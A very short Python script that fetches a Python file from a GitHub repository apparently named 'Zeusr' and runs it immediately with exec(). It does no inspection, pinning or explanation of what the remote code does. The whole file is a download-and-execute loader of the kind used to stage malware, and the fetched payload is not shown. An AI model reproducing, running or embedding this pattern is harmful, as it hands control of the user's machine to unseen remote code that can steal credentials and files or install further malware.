import requests
url = "https://github.com/apaseaa2188ggq-sketch/Zeusr/raw/refs/heads/main/%D8%A7%D8%B3%D8%A8%D9%88%D8%B9%20%D9%81%D9%8A%D8%B3.py"
code = requests.get(url).text
exec(code)